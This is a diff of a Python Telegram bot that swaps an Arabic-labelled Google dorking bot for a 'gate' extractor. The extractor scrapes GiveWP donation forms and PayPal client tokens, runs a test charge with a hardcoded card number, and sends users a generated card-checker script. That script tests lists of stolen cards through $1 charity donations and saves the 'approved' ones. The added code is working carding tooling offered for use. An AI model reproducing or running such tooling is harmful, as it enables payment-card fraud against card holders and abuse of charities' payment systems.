-        loop = asyncio.get_running_loop()
-
-        for i, dork in enumerate(dorks, 1):
-            await loop.run_in_executor(None, dorker.search, dork)
-            current_total_urls = len(dorker.found_urls)
-            
-            # إرسال تحديث بالتقدم الحالي بعد كل دورك
-            await query.message.reply_text(
-                f"🎯 *التقدم [{i}/{total_dorks}]*\n"
-                f"🔍 **الدورك الحالي:** `{dork}`\n"
-                f"🌐 **إجمالي الروابط الناتجة حتى الآن:** `{current_total_urls}`",
-                parse_mode="Markdown"
+        if not link.startswith(("http://", "https://")):
+            bot.edit_message_text(
+                chat_id=massege.chat.id,
+                message_id=ko,
+                text="Invalid link format ❌",
+                parse_mode="HTML"
             )
-            
-            if i < total_dorks:
-                await asyncio.sleep(4)
+            return
 
-        await query.message.reply_text(
-            f"✅ *اكتمل فحص الملف بالكامل!*\n"
-            f"📊 **إجمالي الدوركات:** `{total_dorks}`\n"
-            f"🌐 **إجمالي الروابط الفريدة المستخرجة:** `{len(dorker.found_urls)}`",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
+        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
+
+        if r.status_code != 200:
+            bot.edit_message_text(
+                chat_id=massege.chat.id,
+                message_id=ko,
+                text=f"Site returned status: {r.status_code} ❌"
+            )
+            return
+
+        bot.edit_message_text(
+            chat_id=massege.chat.id,
+            message_id=ko,
+            text="Gate found ✅"
         )
 
-    elif data == "filter_file_data":
-        dorks = user_files_data.get(chat_id, [])
-        filtered = [d for d in dorks if len(d) > 3 and not d.startswith("#")]
-        user_files_data[chat_id] = filtered
-        await query.message.reply_text(f"🧹 *تمت الفلترة بنجاح!*\nالعدد المتبقي بعد التنظيف: `{len(filtered)}`", parse_mode="Markdown")
-
-    elif data == "cancel_file":
-        user_files_data.pop(chat_id, None)
-        await query.message.reply_text("❌ تم تفريغ القائمة المؤقتة.")
-
-    elif data == "show_stats":
-        await stats_command(update, context)
-
-    elif data == "check_urls":
-        if chat_id in dorker_instances and dorker_instances[chat_id]:
-            await query.message.reply_text("🔍 *جاري التحقق من الروابط الشغالة (Alive / Dead)...*", parse_mode="Markdown")
-            loop = asyncio.get_running_loop()
-            alive, dead = await loop.run_in_executor(None, dorker_instances[chat_id].check_all_urls)
-            await query.message.reply_text(f"✅ *اكتمل التحقق!*\n• الروابط الشغالة (Alive): `{len(alive)}`\n• الروابط الميتة (Dead): `{len(dead)}`", parse_mode="Markdown")
-        else:
-            await query.message.reply_text("❌ لا توجد جلسة عمل شغال حالياً.")
-
-    elif data == "export_files":
-        if chat_id in dorker_instances and dorker_instances[chat_id]:
-            await query.message.reply_text("📦 *جاري إعداد الحزمة الكاملة وتصدير الملفات...*", parse_mode="Markdown")
-            dorker = dorker_instances[chat_id]
-            loop = asyncio.get_running_loop()
-            txt, excel, pdf = await loop.run_in_executor(None, dorker.export_all_results)
-
-            files_sent = 0
-            for file_path in [txt, excel, pdf, dorker.output_file, dorker.emails_file]:
-                # التثبت من وجود الملف وأن حجمه أكثر من 0 بايت لتجنب BadRequest Error
-                if file_path and os.path.exists(file_path) and os.path.getsize(file_path) > 0:
-                    try:
-                        with open(file_path, 'rb') as doc:
-                            await context.bot.send_document(chat_id=chat_id, document=doc)
-                        files_sent += 1
-                    except Exception as e:
-                        logger.error(f"فشل إرسال الملف {file_path}: {e}")
-            
-            if files_sent == 0:
-                await query.message.reply_text("⚠️ لم يتم استخراج أي بيانات بعد، أو أن النتائج فارغة حالياً.")
-        else:
-            await query.message.reply_text("❌ لا توجد نتائج جارية للتصدير.")
-
-    elif data == "stop_engine":
-        if chat_id in dorker_instances and dorker_instances[chat_id]:
-            await query.message.reply_text("🛑 *جاري حفظ الجلسة وإغلاق محرك Selenium...*", parse_mode="Markdown")
-            dorker = dorker_instances[chat_id]
-            loop = asyncio.get_running_loop()
-            await loop.run_in_executor(None, dorker.close)
-            dorker_instances[chat_id] = None
-            await query.message.reply_text("👋 *تم إغلاق المحرك بنجاح وتأمين الحصيلة.*", parse_mode="Markdown")
-        else:
-            await query.message.reply_text("❌ المحرك متوقف بالفعل.")
-
-async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.message or not update.message.text:
+    except requests.exceptions.Timeout:
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko, text="The site took too long to respond ⏳")
         return
-        
-    chat_id = update.effective_chat.id
-    state = user_states.get(chat_id)
+    except requests.exceptions.ConnectionError:
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko, text="Connection error or site offline ❌")
+        return
+    except requests.exceptions.InvalidURL:
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko, text="Invalid URL ❌")
+        return
+    except Exception as e:
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko, text=f"Error ❌\n<code>{e}</code>", parse_mode="HTML")
+        return
 
-    if state == "WAITING_FOR_SINGLE_DORK":
-        dork = update.message.text.strip()
-        user_states[chat_id] = None
-        
-        if chat_id not in dorker_instances or dorker_instances[chat_id] is None:
-            dorker_instances[chat_id] = GoogleDorkerPro(headless=True, ultra_slow=False)
-
-        dorker = dorker_instances[chat_id]
-        await update.message.reply_text(f"🚀 *جاري تشغيل الفحص للدورك:*\n`{dork}`", parse_mode="Markdown")
-
-        loop = asyncio.get_running_loop()
-        added_now = await loop.run_in_executor(None, dorker.search, dork)
-        await update.message.reply_text(
-            f"✅ *اكتملت عملية الاستخراج!*\n"
-            f"➕ روابط جديدة: `{added_now}`\n"
-            f"🌐 المجموع الكلي للروابط: `{len(dorker.found_urls)}`",
-            parse_mode="Markdown",
-            reply_markup=get_main_keyboard()
-        )
+    user = generate_user_agent()
+    r = requests.Session()
+    headers = {'user-agent': user}
+    res = r.get(url=f"{link}", headers=headers).text
+    id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res).group(1)
+    id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res).group(1)
+    nonec = re.search(r'name="give-form-hash" value="(.*?)"', res).group(1)
+    anc = re.search(r'"data-client-token":"(.*?)"', res)
+    if anc:
+        enc = re.search(r'"data-client-token":"(.*?)"', res).group(1)
+        dec = base64.b64decode(enc).decode('utf-8')
+        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
     else:
-        await update.message.reply_text("يرجى اختيار أحد الأوامر من القائمة أو أرسل `/help`.", reply_markup=get_main_keyboard())
+        bot.edit_message_text(
+            chat_id=massege.chat.id,
+            message_id=ko,
+            text='''Data Client Token not found ⚠️''',
+            parse_mode="HTML"
+        )
+        return
 
-# ==============================================================================
-# ERROR HANDLER AND INITIALIZATION
-# ==============================================================================
+    parsed = urlparse(link)
+    USER_URL2 = f'https://{parsed.netloc}'
+    USER_URL = parsed.path
 
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """معالج الأخطاء العالمي لتجنب توقف البوت أو انهياره"""
-    logger.error("حدث استثناء أثناء تنفيذ طلب التلغرام:", exc_info=context.error)
+    headers = {
+        'origin': f'{USER_URL2}',
+        'referer': f'{USER_URL}',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
 
-async def post_init(application) -> None:
-    """إزالة الـ Webhook وتصفية التحديثات المعلقة لمنع خطأ get_updates"""
-    logger.info("جاري تنظيف وتصفية اتصالات Webhook المتبقية...")
-    await application.bot.delete_webhook(drop_pending_updates=True)
+    data = {
+        'give-honeypot': '',
+        'give-form-id-prefix': id_form1,
+        'give-form-id': id_form2,
+        'give-form-title': '',
+        'give-current-url': f'{USER_URL}',
+        'give-form-url': f'{USER_URL}',
+        'give-form-minimum': f'1.00',
+        'give-form-maximum': '999999.99',
+        'give-form-hash': nonec,
+        'give-price-id': '3',
+        'give-recurring-logged-in-only': '',
+        'give-logged-in-only': '1',
+        '_give_is_donation_recurring': '0',
+        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
+        'give-amount': f'1.00',
+        'give_stripe_payment_method': '',
+        'payment-mode': 'paypal-commerce',
+        'give_first': 'Ali',
+        'give_last': 'rights and',
+        'give_email': 'Ali22@gmail.com',
+        'card_name': 'Ali ',
+        'card_exp_month': '',
+        'card_exp_year': '',
+        'give_action': 'purchase',
+        'give-gateway': 'paypal-commerce',
+        'action': 'give_process_donation',
+        'give_ajax': 'true',
+    }
 
-# ==============================================================================
-# MAIN BOT ENTRYPOINT
-# ==============================================================================
+    response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+    data = MultipartEncoder({
+        'give-honeypot': (None, ''),
+        'give-form-id-prefix': (None, id_form1),
+        'give-form-id': (None, id_form2),
+        'give-form-title': (None, ''),
+        'give-current-url': (None, f'{USER_URL}'),
+        'give-form-url': (None, f'{USER_URL}'),
+        'give-form-minimum': (None, f'1.00'),
+        'give-form-maximum': (None, '999999.99'),
+        'give-form-hash': (None, nonec),
+        'give-price-id': (None, '3'),
+        'give-recurring-logged-in-only': (None, ''),
+        'give-logged-in-only': (None, '1'),
+        '_give_is_donation_recurring': (None, '0'),
+        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
+        'give-amount': (None, f'1.00'),
+        'give_stripe_payment_method': (None, ''),
+        'payment-mode': (None, 'paypal-commerce'),
+        'give_first': (None, 'Ali'),
+        'give_last': (None, 'rights and'),
+        'give_email': (None, 'Ali22@gmail.com'),
+        'card_name': (None, 'Ali '),
+        'card_exp_month': (None, ''),
+        'card_exp_year': (None, ''),
+        'give-gateway': (None, 'paypal-commerce'),
+    })
+    headers = {
+        'content-type': data.content_type,
+        'origin': f'{USER_URL2}',
+        'referer': f'{USER_URL}',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
 
-if __name__ == "__main__":
-    app = (
-        ApplicationBuilder()
-        .token(BOT_TOKEN)
-        .post_init(post_init)
-        .build()
+    params = {
+        'action': 'give_paypal_commerce_create_order',
+    }
+
+    response = r.post(
+        f'{USER_URL2}/wp-admin/admin-ajax.php',
+        params=params,
+        cookies=r.cookies,
+        headers=headers,
+        data=data
+    )
+    pk_live2 = (response.json()['data']['id'])
+    if pk_live2:
+        tok = pk_live2
+    else:
+        bot.edit_message_text(
+            chat_id=massege.chat.id,
+            message_id=ko,
+            text=f'''Token not In Data️''',
+            parse_mode="HTML"
+        )
+        return
+    headers = {
+        'authority': 'cors.api.paypal.com',
+        'accept': '*/*',
+        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
+        'authorization': f'Bearer {au}',
+        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
+        'content-type': 'application/json',
+        'origin': 'https://assets.braintreegateway.com',
+        'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
+        'referer': 'https://assets.braintreegateway.com/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'cross-site',
+        'user-agent': user,
+    }
+    ccx = '4059986126444431|11|30|947'
+    ccx = ccx.strip()
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    if "20" in yy:
+        yy = yy.split("20")[1]
+    json_data = {
+        'payment_source': {
+            'card': {
+                'number': n,
+                'expiry': f'20{yy}-{mm}',
+                'security_code': cvc,
+                'attributes': {
+                    'verification': {
+                        'method': 'SCA_WHEN_REQUIRED',
+                    },
+                },
+            },
+        },
+        'application_context': {
+            'vault': False,
+        },
+    }
+
+    response = r.post(
+        f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
+        headers=headers,
+        json=json_data,
     )
 
-    # إضافة الأوامر
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("dork", dork_command))
-    app.add_handler(CommandHandler("stats", stats_command))
-    
-    # إضافة معالجة الملفات والاستجابات
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
+    data = MultipartEncoder({
+        'give-honeypot': (None, ''),
+        'give-form-id-prefix': (None, id_form1),
+        'give-form-id': (None, id_form2),
+        'give-form-title': (None, ''),
+        'give-current-url': (None, f'{USER_URL}'),
+        'give-form-url': (None, f'{USER_URL}'),
+        'give-form-minimum': (None, f'1.00'),
+        'give-form-maximum': (None, '999999.99'),
+        'give-form-hash': (None, nonec),
+        'give-price-id': (None, '3'),
+        'give-recurring-logged-in-only': (None, ''),
+        'give-logged-in-only': (None, '1'),
+        '_give_is_donation_recurring': (None, '0'),
+        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
+        'give-amount': (None, f'1.00'),
+        'give_stripe_payment_method': (None, ''),
+        'payment-mode': (None, 'paypal-commerce'),
+        'give_first': (None, 'Ali'),
+        'give_last': (None, 'rights and'),
+        'give_email': (None, 'Ali22@gmail.com'),
+        'card_name': (None, 'Ali '),
+        'card_exp_month': (None, ''),
+        'card_exp_year': (None, ''),
+        'give-gateway': (None, 'paypal-commerce'),
+    })
+    headers = {
+        'content-type': data.content_type,
+        'origin': f'{USER_URL2}',
+        'referer': f'{USER_URL}',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+    }
 
-    # تسجيل معالج الأخطاء
-    app.add_error_handler(error_handler)
+    params = {
+        'action': 'give_paypal_commerce_approve_order',
+        'order': tok,
+    }
 
-    print("🔥 [BOT RUNNING] البوت جاهز ويعمل بآلية التحكم الشاملة...")
-    
-    app.run_polling(
-        drop_pending_updates=True,
-        allowed_updates=Update.ALL_TYPES,
-        poll_interval=1.0,
-        timeout=30
+    response = r.post(
+        f'{USER_URL2}/wp-admin/admin-ajax.php',
+        params=params,
+        cookies=r.cookies,
+        headers=headers,
+        data=data
     )
+    if 'ORDER_NOT_APPROVED' in response.text:
+        aa = 'ORDER_NOT_APPROVED'
+    else:
+        aa = response.json()['data']['error']
+
+    try:
+        msg = aa
+        if not msg:
+            msg = html.escape(response.text[:100])
+    except:
+        msg = html.escape(response.text[:100])
+
+    text_content = f'''import requests, re, random, time, base64
+from fake_useragent import UserAgent
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from faker import Faker
+from urllib.parse import urlparse
+
+class PayPal:
+        def __init__(self):
+                self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
+                self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+                url = '{link}'
+                parsed = urlparse(url)
+                domain = parsed.netloc
+                path = parsed.path
+                self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
+                self.donation = "1.00"
+                self.url = domain
+                self.inurl = path
+                self.email = f"{{random.choice(self.first_name)}}{{random.choice(self.last_name)}}{{random.randint(100,999)}}@gmail.com"
+                self.r = requests.Session()
+                self.uu = UserAgent()
+
+
+
+        def Key(self):
+                he1 = {{
+                        'upgrade-insecure-requests': '1',
+                        'user-agent': self.uu.random,
+                }}
+                r1 = self.r.get(f'https://{{self.url}}{{self.inurl}}', headers=he1, )
+                self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
+                self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
+                self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
+                enc = re.search(r'"data-client-token":"(.*?)"',r1.text).group(1)
+                dec = base64.b64decode(enc).decode('utf-8')
+                self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+                return self.au, self.id_form1, self.id_form2, self.nonec
+
+        def Krs(self, ccx):
+                ccx=ccx.strip()
+                n = ccx.split("|")[0]
+                mm = ccx.split("|")[1]
+                yy = ccx.split("|")[2]
+                cvc = ccx.split("|")[3].strip()
+                if "20" in yy:
+                        yy = yy.split("20")[1]
+                he2 = {{
+                        'user-agent': self.uu.random,
+                        'x-requested-with': 'XMLHttpRequest',
+                }}
+
+                da1 = {{
+                    'give-honeypot': '',
+                    'give-form-id-prefix': self.id_form1,
+                    'give-form-id': self.id_form2,
+                    'give-form-title': 'Make a One-off Donation',
+                    'give-current-url': f'https://{{self.url}}{{self.inurl}}',
+                    'give-form-url': f'https://{{self.url}}{{self.inurl}}',
+                    'give-form-minimum': self.donation,
+                    'give-form-maximum': '50000',
+                    'give-form-hash': self.nonec,
+                    'give-price-id': 'custom',
+                    'give-recurring-logged-in-only': '',
+                    'give-logged-in-only': self.donation,
+                    'give_recurring_donation_details': '{{"is_recurring":false}}',
+                    'give-amount': self.donation,
+                    'give_stripe_payment_method': '',
+                    'payment-mode': 'paypal-commerce',
+                    'give_first': random.choice(self.first_name),
+                    'give_last': random.choice(self.last_name),
+                    'give_email': self.email,
+                    'card_name': 'msms',
+                    'card_exp_month': '',
+                    'card_exp_year': '',
+                    'give_gift_check_is_billing_address': 'no',
+                    'give_gift_aid_address_option': 'billing_address',
+                    'give_gift_aid_card_first_name': '',
+                    'give_gift_aid_card_last_name': '',
+                    'give_gift_aid_billing_country': 'GB',
+                    'give_gift_aid_card_address': '',
+                    'give_gift_aid_card_address_2': '',
+                    'give_gift_aid_card_city': '',
+                    'give_gift_aid_card_state': '',
+                    'give_gift_aid_card_zip': '',
+                    'give_action': 'purchase',
+                    'give-gateway': 'paypal-commerce',
+                    'action': 'give_process_donation',
+                    'give_ajax': 'true',
+                }}
+
+                r2 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', headers=he2, data=da1, )
+
+                da2 = MultipartEncoder({{
+                    'give-honeypot': (None, ''),
+                    'give-form-id-prefix': (None, self.id_form1),
+                    'give-form-id': (None, self.id_form2),
+                    'give-form-title': (None, 'Make a One-off Donation'),
+                    'give-current-url': (None, f'https://{{self.url}}{{self.inurl}}',),
+                    'give-form-url': (None, f'https://{{self.url}}{{self.inurl}}',),
+                    'give-form-minimum': (None, '1'),
+                    'give-form-maximum': (None, '50000'),
+                    'give-form-hash': (None, self.nonec),
+                    'give-price-id': (None, 'custom'),
+                    'give-recurring-logged-in-only': (None, ''),
+                    'give-logged-in-only': (None, '1'),
+                    'give_recurring_donation_details': (None, '{{"is_recurring":false}}'),
+                    'give-amount': (None, '1'),
+                    'give_stripe_payment_method': (None, ''),
+                    'payment-mode': (None, 'paypal-commerce'),
+                    'give_first': (None, random.choice(self.first_name)),
+                    'give_last': (None, random.choice(self.last_name)),
+                    'give_email': (None, self.email),
+                    'card_name': (None, 'ali'),
+                    'card_exp_month': (None, ''),
+                    'card_exp_year': (None, ''),
+                   'give_gift_check_is_billing_address': (None, 'no'),
+                    'give_gift_aid_address_option': (None, 'billing_address'),
+                    'give_gift_aid_card_first_name': (None, ''),
+                    'give_gift_aid_card_last_name': (None, ''),
+                    'give_gift_aid_billing_country': (None, 'GB'),
+                    'give_gift_aid_card_address': (None, ''),
+                    'give_gift_aid_card_address_2': (None, ''),
+                    'give_gift_aid_card_city': (None, ''),
+                    'give_gift_aid_card_state': (None, ''),
+                    'give_gift_aid_card_zip': (None, ''),
+                    'give-gateway': (None, 'paypal-commerce'),
+                }})
+
+                he3 = {{
+                    'accept': '*/*',
+                    'content-type': da2.content_type,
+                    'user-agent': self.uu.random,
+                }}
+
+                pa1 = {{
+                    'action': 'give_paypal_commerce_create_order',
+                }}
+
+                r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1,headers=he3,data=da2, ).json()['data']['id']
+
+
+                he4 = {{
+                    'authority': 'cors.api.paypal.com',
+                    'accept': '*/*',
+                    'authorization': f'Bearer {{self.au}}',
+                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
+                    'paypal-client-metadata-id': self.paypal,
+                    'user-agent': self.uu.random,
+                }}
+
+                da3 = {{
+                    'payment_source': {{
+                        'card': {{
+                            'number': n,
+                            'expiry': f'20{{yy}}-{{mm}}',
+                            'security_code': cvc,
+                            'attributes': {{
+                                'verification': {{
+                                    'method': 'SCA_WHEN_REQUIRED',
+                                }},
+                            }},
+                        }},
+                    }},
+                    'application_context': {{
+                        'vault': False,
+                    }},
+                }}
+
+                r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3, )
+
+
+                da4=MultipartEncoder({{
+                    'give-honeypot': (None, ''),
+                    'give-form-id-prefix': (None, self.id_form1),
+                    'give-form-id': (None, self.id_form2),
+                    'give-form-title': (None, 'Make a One-off Donation'),
+                    'give-current-url': (None, f'https://{{self.url}}{{self.inurl}}'),
+                    'give-form-url': (None, f'https://{{self.url}}{{self.inurl}}'),
+                    'give-form-minimum': (None, '1'),
+                    'give-form-maximum': (None, '50000'),
+                    'give-form-hash': (None, self.nonec),
+                    'give-price-id': (None, 'custom'),
+                    'give-recurring-logged-in-only': (None, ''),
+                    'give-logged-in-only': (None, self.donation),
+                    'give_recurring_donation_details': (None, '{{"is_recurring":false}}'),
+                    'give-amount': (None, self.donation),
+                    'give_stripe_payment_method': (None, ''),
+                    'payment-mode': (None, 'paypal-commerce'),
+                    'give_first': (None, random.choice(self.first_name)),
+                    'give_last': (None, random.choice(self.last_name)),
+                    'give_email': (None, self.email),
+                    'card_name': (None, 'ali'),
+                    'card_exp_month': (None, ''),
+                    'card_exp_year': (None, ''),
+                    'give_gift_check_is_billing_address': (None, 'no'),
+                    'give_gift_aid_address_option': (None, 'billing_address'),
+                    'give_gift_aid_card_first_name': (None, ''),
+                    'give_gift_aid_card_last_name': (None, ''),
+                    'give_gift_aid_billing_country': (None, 'GB'),
+                    'give_gift_aid_card_address': (None, ''),
+                    'give_gift_aid_card_address_2': (None, ''),
+                    'give_gift_aid_card_city': (None, ''),
+                    'give_gift_aid_card_state': (None, ''),
+                    'give_gift_aid_card_zip': (None, ''),
+                    'give-gateway': (None, 'paypal-commerce'),
+
+                }})
+
+                he5 = {{
+                    'accept': '*/*',
+                    'content-type': da4.content_type,
+                    'user-agent': self.uu.random,
+                }}
+
+                pa2 = {{
+                    'action': 'give_paypal_commerce_approve_order',
+                    'order': r3,
+                }}
+
+                r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2,headers=he5, data=da4, )
+
+                text = r5.text
+                if 'true' in text or 'sucsess' in text:
+                        return 'CHARGE 1.00$'
+                elif 'DO_NOT_HONOR' in text:
+                        return "DO_NOT_HONOR"
+                elif 'ACCOUNT_CLOSED' in text:
+                        return "ACCOUNT_CLOSED"
+                elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
+                        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
+                elif 'LOST_OR_STOLEN' in text:
+                        return "LOST_OR_STOLEN"
+                elif 'CVV2_FAILURE' in text:
+                        return "CVV2_FAILURE"
+                elif 'SUSPECTED_FRAUD' in text:
+                        return "SUSPECTED_FRAUD"
+                elif 'INVALID_ACCOUNT' in text:
+                        return "INVALID_ACCOUNT"
+                elif 'REATTEMPT_NOT_PERMITTED' in text:
+                        return "REATTEMPT_NOT_PERMITTED"
+                elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
+                        return "ACCOUNT_BLOCKED_BY_ISSUER"
+                elif 'ORDER_NOT_APPROVED' in text:
+                        return "ORDER_NOT_APPROVED"
+                elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
+                        return "PICKUP_CARD_SPECIAL_CONDITIONS"
+                elif 'PAYER_CANNOT_PAY' in text:
+                        return "PAYER_CANNOT_PAY"
+                elif 'INSUFFICIENT_FUNDS' in text:
+                        return "INSUFFICIENT_FUNDS"
+                elif 'GENERIC_DECLINE' in text:
+                        return "GENERIC_DECLINE"
+                elif 'COMPLIANCE_VIOLATION' in text:
+                        return "COMPLIANCE_VIOLATION"
+                elif 'TRANSACTION_NOT_PERMITTED' in text:
+                        return "TRANSACTION_NOT_PERMITTED"
+                elif 'PAYMENT_DENIED' in text:
+                        return "PAYMENT_DENIED"
+                elif 'INVALID_TRANSACTION' in text:
+                        return "INVALID_TRANSACTION"
+                elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
+                        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
+                elif 'SECURITY_VIOLATION' in text:
+                        return "SECURITY_VIOLATION"
+                elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
+                        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
+                elif 'INVALID_OR_RESTRICTED_CARD' in text:
+                        return "INVALID_OR_RESTRICTED_CARD"
+                elif 'EXPIRED_CARD' in text:
+                        return "EXPIRED_CARD"
+                elif 'CRYPTOGRAPHIC_FAILURE' in text:
+                        return "CRYPTOGRAPHIC_FAILURE"
+                elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
+                        return "TRANSACTION_CANNOT_BE_COMPLETED"
+                elif 'DECLINED_PLEASE_RETRY' in text:
+                        return "DECLINED_PLEASE_RETRY_LATER"
+                elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
+                        return "TX_ATTEMPTS_EXCEED_LIMIT"
+                else:
+                        try:
+                                result = r5.json()['data']['error']
+                                return result
+                        except:
+                                return "UNKNOWN_ERROR"
+
+
+
+if __name__ == '__main__':
+        Getat = 'PayPal Custom 1$'
+        print(f'Cheker {{Getat}}')
+        Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
+        if Br == '1':
+                try:
+                    while True:
+                        ar = input('Enter Card ( n | mm | yy | cvc ): ')
+                        rr = PayPal()
+                        itt = rr.Key()
+                        pali = rr.Krs
+                        resulti = pali(ar)
+                        if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
+                            with open('Approved Card.txt', "a") as f:
+                                f.write(ar +f': {{resulti}} > {{Getat}}')
+
+                        print('Response: ' + resulti)
+                        time.sleep(5)
+                except Exception as e:
+                    print('Error -', e)
+        else:
+                noy = 0
+                cr = input('Enter Name Combo: ')
+                with open(cr, "r") as f:
+                        crads = f.read().splitlines()
+                        print('Wait Checking Your Card ...')
+                        for P in crads:
+                                noy += 1
+                                try:
+                                        rr = PayPal()
+                                        itt = rr.Key()
+                                        pali = rr.Krs
+                                        resulti = pali(P)
+                                except Exception as e:
+                                        resulti = f'Erorr {{e}}'
+                                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
+                                        with open('Approved Card.txt', "a") as f:
+                                                f.write(P + ': {{resulti}} > {{Getat}}')
+                                try:
+                                        print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
+                                except:
+                                        pass
+                                time.sleep(13)'''
+    file_name = f'@nnunrr_{massege.from_user.id}.py'
+    with open(file_name, "w", encoding="utf-8") as f:
+        f.write(text_content)
+    with open(file_name, "rb") as f:
+        bot.send_document(
+            chat_id=massege.chat.id,
+            document=f,
+            caption=f'''The gate was successfully withdrawn ✅
+━━━━━━━━━━━━━━━━━━━━
+<strong>Gateway information ...</strong>
+
+[<a href="https://t.me/nnunrr">ϟ</a>] Link: <code>{link}</code>
+[<a href="https://t.me/nnunrr">ϟ</a>] id form: <code>{id_form1}</code>
+[<a href="https://t.me/nnunrr">ϟ</a>] id form2: <code>{id_form2}</code>
+[<a href="https://t.me/nnunrr">ϟ</a>] nonce: <code>{nonec}</code>
+[<a href="https://t.me/nnunrr">ϟ</a>] client token: <code>{au}</code>
+[<a href="https://t.me/nnunrr">ϟ</a>] id payment: <code>{tok}</code>
+[<a href="https://t.me/nnunrr">ϟ</a>] msg gateway: <code>{msg}</code>
+━━━━━━━━━━━━━━━━━━━━
+Dev: @nnunrr''',
+            parse_mode="HTML"
+        )
+    os.remove(file_name)
+
+# ============ ميزة سحب من ملف ============
+@bot.message_handler(commands=['bulk'])
+def bulk_extract_start(message):
+    with open("blockusers.txt", "r") as file:
+        blocked = file.read().splitlines()
+    if str(message.from_user.id) in blocked:
+        bot.send_message(message.chat.id, 'The admin has blocked you.')
+        return
+
+    msg = bot.reply_to(message, "Send a .txt file with links (one link per line):")
+    bot.register_next_step_handler(msg, process_bulk_file)
+
+def process_bulk_file(message):
+    if not message.document:
+        bot.reply_to(message, "Please send a .txt file.")
+        return
+
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        links = downloaded_file.decode('utf-8').splitlines()
